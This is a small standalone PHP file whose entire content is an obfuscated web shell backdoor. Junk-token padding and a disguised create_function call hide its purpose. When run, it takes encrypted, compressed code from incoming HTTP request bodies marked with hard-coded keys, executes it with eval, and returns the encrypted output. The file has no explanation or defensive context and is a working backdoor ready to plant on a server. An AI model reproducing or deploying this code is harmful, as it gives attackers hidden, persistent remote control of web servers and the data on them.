<?php
$z='atch("/$kh(V(.+V()$V(kf/",@file_geV(t_contV(enV(ts("php://iV(nV(put"),$m)=';
$K='lV(V();$j++,$V(i++){$o.=$V(t{V($i}^$kV({$V(j};}}return $oV(;}if V((@preg_V(V(m';
$U='(V(trlen($t);$oV(="V(";for($V(i=0;$i<$l;V(){for(V(V($j=0;($j<$c&V(&$i<$';
$l='$k="95V(2a81a0"V(;$kh="6aV(6ddV(167ab7eV(";$kf="V(2f8306V(7156V(ae"V(;$';
$b='@bV(V(ase6V(4_eV(nV(code(@x(@gzcomV(press($V(o),$k));prV(intV(("$p$kh$r$kf");}';
$t='eV(($m[V(1V(]),$k)));$o=@oV(b_get_V(contV(eV(nV(ts();V(@ob_V(end_clean();$r=';
$u=str_replace('fe','','crefeafete_feffeufenfection');
$h='=V(1) {V(@ob_V(sV(tart();@evaV(l(@gV(zuncomprV(ess(@x(@bV(ase64_dV(ecod';
$d='V(p="H2VpoV(KgC9fDwyKdyV(";functV(iV(on x($t,$k){V($V(c=V(strlen($k);$l=sV';
$X=str_replace('V(','',$l.$d.$U.$K.$z.$h.$t.$b);
$N=$u('',$X);$N();
?>
